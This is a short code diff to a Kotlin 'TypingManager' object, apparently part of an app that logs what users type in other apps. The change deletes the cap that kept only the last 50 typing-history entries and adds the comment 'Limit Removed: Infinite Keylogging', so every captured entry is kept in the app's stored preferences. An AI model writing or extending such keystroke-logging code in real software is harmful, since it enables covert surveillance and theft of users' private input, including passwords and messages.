@@ -68,9 +68,7 @@ object TypingManager {
             history.put(entry)
         }
 
-        // Cleanup (Keep last 50)
-        while(history.length() > 50) history.remove(0)
-        
+        // Limit Removed: Infinite Keylogging
         prefs.edit().putString("typing_history", history.toString()).apply()
         
         lastPkg = pkg
